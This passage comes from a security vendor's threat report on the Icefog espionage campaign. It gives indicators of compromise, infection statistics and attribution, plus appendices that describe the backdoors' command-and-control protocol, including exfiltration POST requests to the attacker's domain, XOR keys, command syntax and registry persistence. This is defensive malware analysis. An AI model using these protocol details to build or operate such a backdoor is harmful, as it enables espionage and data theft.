Icefog-NG was\n\ndeveloped by the same author to replace Icefog bot and the web-based Control Panels.\n\nIcefog-NG File Control tab\n\n\n-----\n\nCommand and Control servers\n\nIcefog-NG was designed to be more responsive and convenient to the operator. The data storage is\n\nthe same - local filesystem, and even the file names are the same as on the previous Icefog version.\n\nHere is a screenshot of the user interface from the Icefog-NG C&C application.\n\nIcefog-NG login prompt\n\nLike with the web-based Icefog, this C&C application requires authorization of the operator. While\n\nin the web version it made sense to authenticate remote users to restrict access to the Control\n\nPanel, the desktop application authentication is easily bypassed, because the login and password\n\nare hardcoded in the binary.\n\nHere’s a look at the “victims” panel in the Icefog-NG C&C software:\n\nIcefog-NG UI layout optimized for a screen resolution of 1280x1024\n\n\n-----\n\nCOMMAND AND CONTROL SERVERS\n\nOne curious fact about Icefog-NG is that it is usable only if you have screen resolution set at\n\n1280x1024 or higher. Even on standard 1024x768, not all controls fit into screen. The application\n\nwas created using Microsoft Visual Studio MFC AppWizard. Although, the sample we analyzed\n\nwas compiled in May 2013, the project was most likely started in 2012, which is stated in the\n\n“About Application” message box. This date is put automatically by the AppWizard when the code\n\nis generated for the first time.\n\n\n-----\n\nInfection data and statistics\n\n## ►►INFECTION DATA AND\n### STATISTICS\n\nThe command-and-control servers maintain full logs of the victims together with the various\n\noperations performed on them by the C&C operators. These logs are encrypted with a simple XOR\n\noperation and available to anyone who knows their location and name on the server. Here’s what a\n\ndecoded log looks like:\n\nSample C&C activity log\n\nThese logs can sometimes help to identify the targets of the attacks and in some cases, the victims.\n\nDuring our research, we observed attacks against a number of targets in South Korea, Taiwan\n\nand Japan. These include defense industry contractors such as Lig Nex1 and Selectron Industrial\n\nCompany, shipbuilding companies such as DSME Tech, Hanjin Heavy Industries, telecom operators\n\nsuch as Korea Telecom, media companies such as Fuji TV and the Japan-China Economic Association.\n\nSome organizations that the attackers were interested in targeting\n\n\n-----\n\nINFECTION DATA AND STATISTICS\n\n#### SINKHOLE INFORMATION\n\nDuring our research, we managed to sinkhole 13 domains used by the attackers:\n\n>> spekosoft.com\n\n>> kechospital.com\n\n>> unikorean.com\n\n>> pasakosoft.net\n\n>> chinauswatch.net\n\n>> msvistastar.com\n\n>> defenseasia.net\n\n>> pinganw.org\n\n>> kevinsw.net\n\n>> avatime.net\n\n>> shinebay.net\n\n>> securimalware.net - used in spear-phishing attacks\n\n>> appst0re.net - MacFog’s command-and-control\n\nAll of them have been redirected to the Kaspersky Sinkhole server at 95.211.172.143.\n\nOverall, during the monitoring period, we observed connections from several victims, based in South\n\nKorea, Japan, Taiwan, Germany and some other countries.\n\n\n-----\n\nInfection data and statistics\n\nFor Windows based computers, we have the following statistics:\n\nDistribution by number of hits in our sinkhole (percentage)\n\nDistribution by number of hits in our sinkhole (absolute values)\n\n\n-----\n\n.\n\n\nINFECTION DATA AND STATISTICS\n\nDistribution by number of IPs in our sinkhole (percentage)\n\nDistribution by country by number of IPs in our sinkhole (absolute values)\n\n\n-----\n\nInfection data and statistics\n\nFor Macfog, the Mac OS X version of the backdoor, we have the following statistics:\n\nDistribution by number of IPs in our sinkhole (percentage)\n\nDistribution by number of IPs in our sinkhole (absolute values)\n\nOverall, we’ve observed over 4500 IPs with infected Macfog hosts, belonging to more than 430\n\nunique victims.\n\n\n-----\n\nINFECTION DATA AND STATISTICS\n\nFor Windows-based machines, our sinkhole received connections from almost 200 unique IPs, in\n\nsix countries.\n\nIt should be noted that in terms of the overall picture, these sinkholed domains offer a view of only\n\na fraction of the infected computers, especially old infections which for some reason have not yet\n\nbeen disinfected. The newer attacks are more difficult to track because they use new C&C domains\n\nthat can’t be easily sinkholed.\n\nAnother important note relates to geographical distribution of victims. While we see many\n\nconnections coming from China, this doesn’t mean that it has victims of targeted attacks. Because\n\nthe Macfog samples that we have seen are being distributed in a trojanized bundle with legitimate\n\nsoftware on publicly available Chinese message boards, visitors (especially those who read Chinese)\n\nfrom any country in the world could get infected. We believe that a primary goal of doing that was\n\nto test malware in different environments and evaluate its efficiency. That explains why the domain\n\nused as C2 was abandoned - random victims had less value for the attackers.\n\nBased on the more reliable analysis of the C&C servers used in the targeted attacks, spearphishing\n\nexamples and other data collected during our research, we believe that the primary targets of the\n\nIcefog operations were in South Korea and Japan.\n\n\n-----\n\nAttribution\n\n## ►►ATTRIBUTION\n\nATTACKER IPS\n\nBased on the list of IPs used to monitor and control the infrastructure, we assume some of the threat\n\nactors behind this operation are based in at least three countries:\n\n>> China (the largest number of connections)\n\n>> South Korea\n\n>> Japan\n\nMore information on attribution is available in our private report for governments. (Contact\n\nintelreports@kaspersky.com)\n\nMALWARE ARTIFACTS\n\nThe “MSUC.DAT” type “2” backdoor has an ASCII string inside with the following content: “Yang.ZC\n\nWang.GS Zhan.QP Ma.J Li.X Hu.HXU”.\n\nIcefog Type “2” hardcoded names\n\n\n-----\n\nATTRIBUTION\n\nThe Icefog Type “2” backdoor loader with MD5 “be043b0d1337f85cfd05f786eaf4f942”, found\n\non the C2 domain “infostaition.com” has the following debug path inside:\n\n“C:\\Users\\yang.zc\\Desktop\\代码片调用程序 4\\Release\\UCCodePieceGo.pdb”\n\nNote that “Yang.zc” appears in both strings. The string “代码片调用程序 4” translates to “Piece of\n\ncode calling 4” from Chinese.\n\nLANGUAGE USAGE\n\nOne of the C&C backend control scripts (control.aspx) has the page title “尖刀三号”, which means\n\n“Dagger Three” in Simplified Chinese.\n\n“Dagger Three” - page title\n\nThe ASPX server-side scripts contain a number of messages and code comments in Chinese:\n\n\n-----\n\nAttribution\n\nOne of the lateral movement tools used by the attackers has a Chinese name:\n\nwindows版本号.txt.jpg - “windows version.txt.jpg”\n\nUnauthenticated C&C login attempts to access the command-and-control user interface result in\n\nredirects to ‘sohu.com’:\n\nNote: “sohu.com” is one of the most popular internet portals in China.\n\nREGISTRATIONS\n\nMore information is available in our private report for governments.\n\n[(Contact intelreports@kaspersky.com)](mailto:intelreports%40kaspersky.com?subject=)\n\n\n-----\n\nMITIGATION INFORMATION\n\n## ►►MITIGATION INFORMATION\n\n#### INDICATORS OF COMPROMISE (IOCS)\n\nC&C DOMAINS AND HOSTNAMES\n\n>> 40yuan.8.100911.com\n\n>> 625tongyi.com\n\n>> 9-joy.net\n\n>> agorajpweb.com\n\n>> appst0re.net - SINKHOLED by Kaspersky Lab\n\n>> bigbombnews.com\n\n>> chinauswatch.net - SINKHOLED by Kaspersky Lab\n\n>> cloudsbit.com\n\n>> cnnpolicy.com\n\n>> dabolloth.com\n\n>> dancewall228.com\n\n>> dashope.net\n\n>> daxituzi.net\n\n>> defenseasia.net - SINKHOLED by Kaspersky Lab\n\n>> disneyland.website.iiswan.com\n\n>> dosaninfracore.com\n\n>> dotaplayers.com\n\n>> electk.net\n\n\n-----\n\nMitigation Information\n\n>> esdlin.com\n\n>> fruitloop.8.100911.com\n\n>> gamestar2.net\n\n>> gangstyleobs.com\n\n>> globalwebnews.net\n\n>> icefog.8.100911.com\n\n>> infostaition.com\n\n>> kakujae.com\n\n>> kansenshu.com\n\n>> kevinsw.net - SINKHOLED by Kaspersky Lab\n\n>> kechospital.com - SINKHOLED by Kaspersky Lab\n\n>> kimjeayun.com\n\n>> koreanmofee.com\n\n>> kreamnnd.com\n\n>> krentertainly.net\n\n>> lexdesign152.net\n\n>> mashuisi.net\n\n>> minihouse.website.iiswan.com\n\n>> msvistastar.com - SINKHOLED by Kaspersky Lab\n\n>> mudain.net\n\n>> namoon-tistory.com\n\n>> newsceekjp.com\n\n>> nk-kotii.com\n\n\n-----\n\nMITIGATION INFORMATION\n\n\n>> pasakosoft.net - SINKHOLED by Kaspersky Lab\n\n>> pinganw.org - SINKHOLED by Kaspersky Lab\n\n>> ppxxcc.org\n\n>> samyongonc.com\n\n>> securimalware.net - SINKHOLED by Kaspersky Lab\n\n>> sejonng.org\n\n>> sejoung.org\n\n>> setchon.com\n\n>> skynet121.net\n\n>> spekosoft.com - SINKHOLED by Kaspersky Lab\n\n>> starwings.net\n\n>> tokyoyan.net\n\n>> twittle.org\n\n>> unikorean.com - SINKHOLED by Kaspersky Lab\n\n>> war3players.com\n\n>> widestar.net\n\n>> womenewes.com\n\n>> yahoowebnews.com\n\n>> zhpedu.org\n\nMALWARE PATHS ON DISK:\n\n>> %TEMP%\\scvhost.exe\n\n>> %TEMP%\\svohost.exe\n\n>> %TEMP%\\msuc.dat\n\n\n-----\n\nMitigation Information\n\n>> %TEMP%\\order.dat\n\n>> %TEMP%\\cmd1.dat\n\n>> %TEMP%\\tmpxor.dat\n\n>> %SYSTEMROOT%\\msld.exe\n\n>> %SYSTEMROOT%\\wdmaud.drv\n\n>> %PROGRAM FILES%\\Internet Explorer\\sxs.dll\n\nMUTEXES:\n\n>> my_horse_mutex_jd2_new\n\n>> my_horse_mutex_jd2_923\n\n>> myhorse_macfee\n\n>> horse_for360\n\n>> myhorsemutexjd3_wm_1226\n\n>> myhorsemutex\n\n>> myhorse_qianfu001\n\n>> myhorse_ie001\n\n>> myhorse_ie_001\n\nUSER AGENT STRINGS (HTTP TRAFFIC):\n\n>> “MyAgent”\n\n>> “mydownload”\n\nE-MAILS ACCOUNTS:\n\nAccounts used to send mail by the older “2011” Icefog:\n\n\n-----\n\nMITIGATION INFORMATION\n\n\n>> harrypottercommand001@aol.com\n\n>> jd2command092@aol.com\n\n>> jd2clientsend@aol.com\n\n>> woshihero009@aol.com\n\n>> mrmylcmd009@aol.com\n\n>> defaultmail002@aol.com\n\n>> 122.10.87.252\n\n>> 113.10.136.228\n\n>> 103.246.245.130\n\n\nIPs\n\n\nNote: due to shared hosting, blocking IPs for Icefog C2s can cause false positives. These IPs are\n\nknown to point to dedicated hosting servers.\n\nDETECTION NAMES BY KASPERSKY PRODUCTS FOR ICEFOG BACKDOORS AND\nRELATED TOOLS\n\n>> Backdoor.ASP.Ace.ah\n\n>> Backdoor.Win32.Agent.dcjj\n\n>> Backdoor.Win32.Agent.dcwq\n\n>> Backdoor.Win32.Agent.dcww\n\n>> Backdoor.Win32.CMDer.ct\n\n>> Backdoor.Win32.Visel.ars\n\n>> Backdoor.Win32.Visel.arx\n\n>> Exploit.MSWord.CVE-2010-3333.cg\n\n>> Exploit.MSWord.CVE-2010-3333.ci\n\n\n-----\n\nMitigation Information\n\n>> Exploit.MSWord.CVE-2012-0158.ae\n\n>> Exploit.MSWord.CVE-2012-0158.az\n\n>> Exploit.MSWord.CVE-2012-0158.bu\n\n>> Exploit.MSWord.CVE-2012-0158.u\n\n>> Exploit.Win32.CVE-2012-0158.j\n\n>> Exploit.Win32.CVE-2012-0158.u\n\n>> Exploit.WinHLP.Agent.d\n\n>> Trojan-Downloader.Win32.Agent.ebie\n\n>> Trojan-Downloader.Win32.Agent.gxmp\n\n>> Trojan-Downloader.Win32.Agent.gzda\n\n>> Trojan-Downloader.Win32.Agent.gznn\n\n>> Trojan-Downloader.Win32.Agent.tenl\n\n>> Trojan-Downloader.Win32.Agent.vigx\n\n>> Trojan-Downloader.Win32.Agent.vkcs\n\n>> Trojan-Downloader.Win32.Agent.wcpy\n\n>> Trojan-Downloader.Win32.Agent.wqbl\n\n>> Trojan-Downloader.Win32.Agent.wqdv\n\n>> Trojan-Downloader.Win32.Agent.wqqz\n\n>> Trojan-Downloader.Win32.Agent.xrlh\n\n>> Trojan-Downloader.Win32.Agent.xsub\n\n>> Trojan-Downloader.Win32.Agent.xyqw\n\n>> Trojan-Downloader.Win32.Agent.yavh\n\n>> Trojan-Downloader.Win32.Agent.yium\n\n\n-----\n\nMITIGATION INFORMATION\n\n\n>> Trojan-Dropper.Win32.Agent.gvfr\n\n>> Trojan-PSW.Win32.MailStealer.j\n\n>> Trojan-Spy.Win32.Agent.bwdf\n\n>> Trojan-Spy.Win32.Agent.bxeo\n\n>> Trojan.PHP.Agent.ax\n\n>> Trojan.Win32.Genome.ydxx\n\n>> Trojan.Win32.Icefog.*\n\n\n-----\n\nConclusions\n\n## ►►CONCLUSIONS\n\nThis paper describes “Icefog”, a small APT group which focuses on targets in South Korea and\n\nJapan. The operation appears to have started in 2011 and increased in size and scope during each\n\nyear. Based on the victim profiles, the attackers appear to have an interest in the following sectors:\n\n>> Military\n\n>> Mass media and TV\n\n>> Shipbuilding and maritime operations\n\n>> Computers and software development\n\n>> Research companies\n\n>> Telecom operators\n\n>> Satellite operators\n\nDespite their relative lack of complexity, the attackers have successfully compromised targets\n\nbelonging to these categories, with the largest number of victims being in South Korea.\n\nThe Icefog attackers have both Windows and Mac OS X backdoors at their disposal. The Mac OS\n\nX backdoor currently remains largely undetected by security solutions and has managed to infect\n\nseveral hundred victims worldwide.\n\nThe “hit and run” nature of this operation is one of the things that make it unusual. While in other\n\ncases, victims remain infected for months or even years, and data is continuously exfiltrated, the\n\nIcefog attackers appear to know very well what they need from the victims. Once the information is\n\nobtained, the victim is abandoned.\n\nDuring the past years, we observed a large increase in the number of APTs which are hitting pretty\n\nmuch all types of victims and sectors. In turn, this is coupled with an increased focus on sensitive\n\ninformation and corporate cyber-espionage.\n\nIn the future, we predict the number of small, focused APT-to-hire groups to grow, specializing in\n\n\n-----\n\nCONCLUSIONS\n\nhit-and-run operations, a kind of “cyber mercenaries” of the modern world.\n\nRecommendations on how to stay safe from such attacks (for both Windows and Mac OS X users):\n\n>> Update Java to the most recent version or, if you don’t use Java, uninstall it.\n\n>> Update Microsoft Windows and Microsoft Office to the latest versions.\n\n>> Update all other third party software, such as Adobe Reader.\n\n>> Be wary of clicking on links and opening attachments from unknown persons.\n\n[>> Windows users can install Microsoft EMET 4.0, a toolkit designed to help prevent hackers](http://www.microsoft.com/en-us/download/details.aspx?id=39273)\n\nfrom gaining access to your system.\n\nSo far, we haven’t observed the use of zero-day vulnerabilities by the Icefog group; to defend\nagainst those, although patches don’t help, technologies such as AEP (Automatic Exploit\n[Prevention) and DefaultDeny can be quite effective.](http://eugene.kaspersky.com/2012/10/03/in-denial-about-deny-all/)\n\n\n-----\n\nAppendix A\n\n## ►►APPENDIX A\n\n#### MALWARE MD5S\n\nSPEARPHISHING DOCUMENTS\n\n|MD5|FILENAME|KASPERSKY NAME|\n|---|---|---|\n|32e8d4b2f08aff883c8016b7ebd7c85b|1234567890.doc|Exploit.MSWord.CVE-2012- 0158.u|\n|219738275b9dfbef6be8b65473833e45|説明書.xls|Exploit.MSWord.CVE-2012- 0158.az|\n|363bcf8bbf8ae7def65adcec0a755d45|n/a|Exploit.MSWord.CVE-2012- 0158.u|\n|3ce3e49e0e31e69b2aabcb3d7569a63c|n/a|Exploit.MSWord.CVE-2012- 0158.u|\n|c5f3d21cb19a4b2d03aa42e4bf43b79b|2345678901.doc|Exploit.MSWord.CVE-2012- 0158.u|\n|b1241cd7a0d7d58d1182badd0adba8ab|n/a|Exploit.MSWord.CVE-2012- 0158.u|\n|7ec89be945add54aa67009dbc12a9260|keikaku-201302.xls|Exploit.OLE2.Multigeneric. gen|\n|eb4579f08cd270e496c70ddcaa29dacb|“CS130116-2 BARILOCHE( ユニバーサル舞鶴 057) MSB. XLS”|Exploit.OLE2.Multigeneric. gen|\n|5aaa057d3447a214e729276563d2f922|打ち合わせ議事録(130204). xls|Exploit.MSWord.CVE-2012- 0158.az|\n\n|Col1|DROPPERS|Col3|Col4|\n|---|---|---|---|\n|MD5|COMPILEDON|KASPERSKY NAME|C2|\n|8f816f4acc49f5ebba00d92437b42e85|2013-01-15 10:51:17|Trojan- Downloader. Win32.Agent.xpxr|asdfghjk.host2.5y6. net/jd/upload.aspx (110.45.203.152 - KR)|\n\n\n-----\n\nAPPENDIX A\n\n\nBACKDOORS\n\n|MD5|COMPILEDON|KASPERSKY NAME|C2|\n|---|---|---|---|\n|f4ced221baf2a482e60baf374ab063be|2012-06-04 15:22:58|Trojan- Downloader. Win32.Agent.vkcs|www.kechospital. com/jd/upload. aspx|\n|3a6feab7eb90b87cf5a4e08bce2572e8|2012-06-04 15:22:56|Trojan- Downloader. Win32.Agent.vkcs|www.kechospital. com/jd/upload. aspx|\n|853096b7e1e4bdb9221875c30d9a15a0|2012-07-03 22:46:52|Trojan- Downloader. Win32.Agent.wpuu|mail.kechospital. com/jd/upload. aspx|\n|2a106c694660891e0950493e3eedc42d|2013-06-19 09:43:17|Trojan- Downloader. Win32.Agent.yium|fruitloop.8.100911. com/news/upload. aspx|\n|6d3d95137ef1ba5c6e15a4a95de8a546|2011-08-05 13:44:30|Trojan-Spy.Win32. Agent.bxeo|www.cloudsbit. com/jd2web/ upload.aspx|\n|15a342cf2cc4fc5ae933d463f5d2196f|2011-08-05 08:46:17|Trojan-Spy.Win32. Agent.bxeo|www.cloudsbit. com/ko/upload. aspx|\n|acc57cc72a8d129703b4914c408a15a1|2011-03-16 10:44:18|Trojan- Downloader. Win32.Agent.tenl|www.cloudsbit. com/tt/upload.aspx|\n|162b349be9c6d11c58cf163e211d891c|2011-07-22 02:51:45|Trojan- Downloader. Win32.Agent.swbo|www.cloudsbit. com/jian3/upload. aspx|\n|f7547f23bd2fd37b7d44e8617f629b49|2011-06-15 02:24:07|Trojan- Downloader. Win32.Agent.gxmp|www.cloudsbit. com/hh/upload. aspx|\n|c352c376968e8a1157fa425431776797|2013-01-16 16:51:32|Trojan- Downloader. Win32.Agent.wqqz|www.9-joy.net/jd/ upload.aspx|\n|31a530fea411455b8844fe019ffb66cd|2013-01-16 16:51:34|Trojan- Downloader. Win32.Agent.wqqz|www.9-joy.net/jd/ upload.aspx|\n|43678aa052ad677841bd2ef532ecd284|2013-06-21 02:43:48|Trojan- Downloader. Win32.Agent.gznn|minihouse.website. iiswan.com/upload/ upload.aspx|\n|fa452f67c6bf8056b563690d61c4a4c6|2013-06-20 22:06:26|Backdoor.Win32. Agent.dcjj|www.kreamnnd. com:5600 (27.255.71.204)|\n|b21635b1b1fce93ff917d9308d4835fb|2013-01-23 08:30:51|Trojan- Downloader. Win32.Agent.xsry|newsceekjp.com/ jd/upload.aspx|\n\n\n-----\n\nAppendix A\n\n|2d6a82fdb59e38d63027beac28dc2813|2012-04-12 18:07:41|Trojan- Downloader. Win32.Agent.vkcs|www.setchon.com/ jd/upload.aspx|\n|---|---|---|---|\n|beb9da03aff9386599625199a5a47b8d|2013-03-18 02:17:49|Trojan- Downloader. Win32.Agent.xyqw|mudain.net/jd/ upload.aspx|\n|80405f5681f1e4f2de6e8c26ec20c14d|2012-01-17 05:55:18|Trojan- Downloader. Win32.Agent.vigx|pinganw.org/jd/ upload.aspx|\n|2761c55bafa96d5814e847b665006e49|2012-07-17 18:16:19|Trojan- Downloader. Win32.Agent.wpzp|199.192.154.124/ jd/upload.aspx|\n|||||\n|566b175ab355e6313ba0ca98b0146d84|2011-09-16 02:30:13|Trojan- Downloader. Win32.Agent.tlod|www.unikorean. com/jd/upload. aspx|\n|d421e0d74fa7035246c1ea51bd4d3114|2013-05-03 03:04:49|Trojan- Downloader. Win32.Agent.yavh|electk.net/jd/ upload.aspx|\n|24751030c1fa40bd57988d4e6fe70117|2012-08-30 01:02:35|Trojan- Downloader. Win32.Agent.wqqz|www.625tongyi. com/jd/upload. aspx|\n|392f5372ba3348ea1820df34c078f6c8|2013-01-08 23:10:42|Trojan- Downloader. Win32.Agent.xpsf|www.dotaplayers. com/jd/upload. aspx|\n|fba7b9ffd08110e37d2bdf77c0d8b806|2013-02-04|Trojan- Downloader. Win32.Agent.xrlh|40yuan.8.100911. com/jd/upload. aspx|\n|0e2694aea9d3de122611d88e37ffc7f0|2011-06-19 10:27:49|Trojan.Win32. Icefog.d|www.chinauswatch. net/test/upload. asp|\n|78d9ac9954516ac096992cf654caa1fc|2012-07-26 03:10:51|Trojan- Downloader. Win32.Agent.gzda|www.setchon.com/ jd/upload.aspx|\n|387ae1e56fa48ec50a46394cc51acce7|2012-07-26 03:10:48|Trojan- Downloader. Win32.Agent.xsub|www.setchon.com/ jd/upload.aspx|\n|cd85a9a05538e89190d519703c9a1327|2012-10-16 19:41:52|Trojan.Win32. Icefog.b|www.samyongonc. com/jd/upload. aspx|\n|f46eb126668dfc843a05958e71936b01|2011-09-23 03:35:50|Trojan.Win32. Icefog.b|www.kevinsw.net/ jd2/upload.aspx|\n\n\n-----\n\nAPPENDIX B\n\n## ►►APPENDIX B\n\n#### MALWARE TECHNICAL ANALYSIS\n\nICEFOG TYPE “1” DESCRIPTION\n\nMD5 SIZE COMPILEDON\n\nBF13CCB777F7175ECD567E757ABCB0E4 79’248 2013-06-19 12:43:17\n\nSUMMARY\n\nThe module is a non-packed Win32 PE DLL file compiled in Microsoft Visual C++ 8.0. The module\n\ninstalls at %WinDir%\\wdmaud.drv and is automatically loaded by explorer.exe on startup. This\n\ntechnique is known as “DLL search order hijacking”, and abuses the fact that Windows Explorer will\n\nload this file from its own directory first, instead of the Windows SYSTEM folder.\n\nIt communicates with the C&C server at ‘icefog.8.100911.com’ (211.42.249.39) and passes\n\ncollected information about victim, lets the operator download or upload files to and from the victim\n\nmachines, execute system commands on the infected machines as well as execute additional\n\nmalware components.\n\nDETAILED DESCRIPTION\n\nAfter the DLL is loaded, it creates system mutex named “myhorse_macfee”. If such mutex already\n\nexists, the module quits to avoid duplicate instances from running.\n\nAfter that, it loads %WinDir%\\wdmaud.drv (this DRV is loaded by explorer.exe on startup) and\n\ncalls exported mymainfunc of its own module that creates a new thread responsible for the\n\ncommunication with C&C.\n\nThe spawned thread collects information about the system such as user names, machine names,\n\nIP addresses, running processes, proxy settings, Windows versions, etc. It produces a report that\n\n|MD5|SIZE|COMPILEDON|\n|---|---|---|\n|BF13CCB777F7175ECD567E757ABCB0E4|79’248|2013-06-19 12:43:17|\n\n\n-----\n\nAppendix B\n\nis later submitted to the C&C server. An example for such a report is shown below:\n\nHostname: <SYSTEM NAME>\n\nIP: <SYSTEM LOCAL IP ADDRESS>\n\nProxy: <LOCAL PROXY SERVER>\n\nUser: <USERNAME>\n\nSystemDir: C:\\WINDOWS\\system32\n\nOS Language Version: <OS LANGUAGE ID>\n\nSystem Version: <OS VERSION>\n\nProcess:\n\nID: 4 (?)\n\nID: 552 (\\SystemRoot\\System32\\smss.exe)\n\n...\n\n(List all running processes and their main executable file path)\n\nThis information is then written to the file at %TMP%\\tmp.dat.\n\nThen, it checks if the %TMP%\\msuc.dat file exists. If it exists, the module creates a new thread\n\nthat will load the file contents into memory and pass execution flow to the first byte of the loaded\n\ndata in memory.\n\nThe contents of the tmp.dat is converted to wide char and XORed with key “*&~^%@0hh8979”.\n\nImmediately after, it is sent via HTTP/1.1 POST request to ‘icefog.8.100911.com’ on port 80.\n\nThe full query string is the following:\n\n**‘/news/upload.aspx?filepath=info&filename=<HOSTNAME>_<HOSTIP>.jpg’.**\n\nFull HTTP headers:\n\nHost: icefog.8.100911.com\n\nUser-Agent: MyAgent\n\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*\n\nAccept-Language: en-us\n\nContent-Type: multipart/form-data’\n\nAccept-Encoding: gzip, deflate\n\n\n-----\n\nAPPENDIX B\n\n\nConnection: Keep-Alive\n\nCache-Control: no-cache\n\nCONTROL COMMANDS\n\nThe module attempts to get ‘icefog.8.100911.com/news/order/<HOSTNAME>_<HOSTIP>.jpg’\n\nfile with custom user agent “mydownload”. The response is saved to file %TMP% \\order.dat\n\nThe content of order.dat is converted from widechar to multibyte string and is parsed for the following\n\ncommand strings:\n\n>> cmd_\n\n>> upload_\n\n>> download_\n\n>> code_\n\nIf any of the commands above is found, the Trojan notifies the C&C that the command was received\n\nby issuing the following POST request:\n\nQuery string: ‘/news/upload.\n\naspx?filepath=order&filename=<HOSTNAME>_<HOSTIP>.jpg’\n\nFull HTTP/1.1 headers:\n\nHost: icefog.8.100911.com\n\nUser agent: MyAgent\n\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*\n\nAccept-Language: en-us\n\nContent-Type: multipart/form-data\n\nAccept-Encoding: gzip, deflate\n\nConnection: Keep-Alive\n\nCache-Control: no-cache\n\n\n-----\n\nAppendix B\n\nCOMMAND CMD_\n\nThe cmd command expect a payload string (<COMMAND>) following the “cmd_” prefix, so that the\n\nfull command syntax looks like this: cmd_<COMMAND>. It creates a new process with command\n\nline C:\\windows\\system32\\cmd.exe /c <COMMAND>\n\nHowever, if <COMMAND> contains output redirection character “>”, the executed command line\n\nwill be as following:\n\nC:\\windows\\system32\\cmd.exe /c command > %TMP%\\ cmd1.dat.\n\nAfter the process has finished its stdout output is sent to the C&C via\n\n**POST request to ‘/news/upload.**\n\naspx?filepath=result&filename=<HOSTNAME>_<HOSTIP>.jpg’\n\nHost: icefog.8.100911.com\n\nUser-Agent: MyAgent\n\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*\n\nAccept-Language: en-us\n\nContent-Type: multipart/form-data\n\nAccept-Encoding: gzip, deflate\n\nConnection: Keep-Alive\n\nCache-Control: no-cache\n\nThe command-line output is converted to wide-char string and XORed using “*&~^%@0hh8979”\n\nstring as the key.\n\nCOMMAND UPLOAD_\n\nThe command string format must be as following: upload_<FILEPATH>_<FILENAME>\n\nIt attempts to fetch icefog.8.100911.com/news/order/<FILENAME> using user agent mydownload\n\nand saves the response to the local path specified in <FILEPATH>.\n\n\n-----\n\nAPPENDIX B\n\nAfter that it notifies the C&C by sending\n\nHTTP/1.1 POST request\n\nQuery string: /news/upload.aspx?filepath=upload&filename=<FILENAME>\n\nFull HTTP/1.1 headers:\n\nHost: icefog.8.100911.com\n\nUser-Agent: MyAgent\n\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*\n\nAccept-Language: en-us\n\nContent-Type: multipart/form-data’\n\nAccept-Encoding: gzip, deflate\n\nConnection: Keep-Alive’\n\nCache-Control: no-cache\n\nCOMMAND DOWNLOAD_\n\nDownload command format must be\n\n“download_<LOCALPATH>\\<FILENAME>/<NAMEONSERVER>\n\nThe <LOCALPATH>\\<FILENAME> file is opened and its content is prepared for uploading by\n\nconverting ANSI data to Unicode and XORing using key “*&~^%@0hh8979”. The result is saved to\n\n%TMP%\\tmpxor.dat’\n\nThe tmpxor.dat is uploaded via POST request to ‘icefog.8.100911.com’ at port 80.\n\nQuery string: ‘/news/upload.aspx?filepath=download&filename=<HOSTNAME>_\n\n**<HOSTIP>_<NAMEONSERVER>_<FILESIZE>.jpg’.**\n\nFull HTTP/1.1 headers:\n\nHost: icefog.8.100911.com\n\nUser-Agent: MyAgent\n\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*\n\nAccept-Language: en-us\n\nContent-Type: multipart/form-data’\n\n\n-----\n\nAppendix B\n\nAccept-Encoding: gzip, deflate\n\nConnection: Keep-Alive\n\nCache-Control: no-cache\n\nCOMMAND CODE_\n\nThe code command format must be code_<FILENAME>\n\nA new thread is created that loads a local file, specified in <FILENAME>, to memory and passes\n\nthe execution to the first byte of the loaded data.\n\nNO COMMAND\n\nIf no known command is parsed out of the server response, the Trojan notifies the server about\n\nbeing alive by issuing the following HTTP POST request:\n\nQuery string: ‘/news/upload.\n\naspx?filepath=ok&filename=<HOSTNAME>_<HOSTIP>.jpg’\n\nHost: icefog.8.100911.com\n\nUser-Agent: MyAgent\n\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*\n\nAccept-Language: en-us\n\nContent-Type: multipart/form-data\n\nAccept-Encoding: gzip, deflate\n\nConnection: Keep-Alive\n\nCache-Control: no-cache.\n\nAfter that it sleeps for 150 seconds and starts the command-processing loop again.\n\n\n-----\n\nAPPENDIX C\n\n## ►►APPENDIX C\n\n#### THE ICEFOG-NG BOT DESCRIPTION\n\nIn addition to the web-based Icefog malware samples, we have come across a variant of the Icefog\n\nbot which is based on a custom protocol working over a TCP session (port 5600 TCP) with its own\n\ndesktop application that serves as a command-and-control center.\n\nFor reference, we called it Icefog-NG (New Generation). We believe that the new generation\n\nof Icefog was created to improve bot response and to increase the efficiency of operations. The\n\nprevious web-based version of the bot had significant time lag during operation (up to 40 seconds),\n\nthe new generation bot was created to solve the time lag issue.\n\nMD5 SIZE COMPILEDON\n\nFA452F67C6BF8056B563690D61C4A4C6 86’016 2013-06-21 01:06:26\n\nSUMMARY\n\nThe module is a non-packed Win32 PE Executable file compiled in Microsoft Visual C++ 2005. It\n\nis a backdoor that is capable of collecting system information, download and upload files, execute\n\ncommands.\n\nDETAILED DESCRIPTION\n\nTo enable automatic start during system boot, the malware adds and uses the following system\n\nregistry value:\n\nHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load=”%TMP%\\msloger.exe”\n\nDuring start it checks if a file named “%TMP%\\~AA.tmp” exists. If yes, it copies the file to %TMP%\\\n\nhwp.hwp. Next it kills processes named “hwp.exe” and then opens “hwp.hwp”. This is important\n\nstep during first malware run which opens a decoy .hwp document. This shows that the malware\n\nwas designed to be installed from .hwp documents containing exploits.\n\n|MD5|SIZE|COMPILEDON|\n|---|---|---|\n|FA452F67C6BF8056B563690D61C4A4C6|86’016|2013-06-21 01:06:26|\n\n\n-----\n\nAppendix C\n\nThen it copies “%TMP%\\~Ab.tmp” to “%TMP%\\msloger.exe”.\n\nAfter that the malware registers on the C&C. To do that, the malware connects to www.kreamnnd.\n\ncom on port 5600 and sends a registration message\n\n[Total message size: DWORD]SX[HOSTID length:WORD][HOSTID][Host Info Data\n\nSize: DWORD][Host Info Data]\n\nHOSTID is a string having system hostname and system IP joined by “_”: Hostname_IP.\n\nThe data is encrypted using XOR with key “&*^*@~^%9?i0h”. If the connection with C&C is lost the\n\nbot can re-establish the session by sending\n\n[Total message size: DWORD]XT[Hostname length:WORD][HOSTNAME]_[IPADDR]\n\nCONTROL COMMANDS\n\nAfter connecting to the C&C and sending the registration message the bot expects commands from\n\nthe server. These commands are described below.\n\nCOMMAND CMD\n\nThis command is used to execute a command 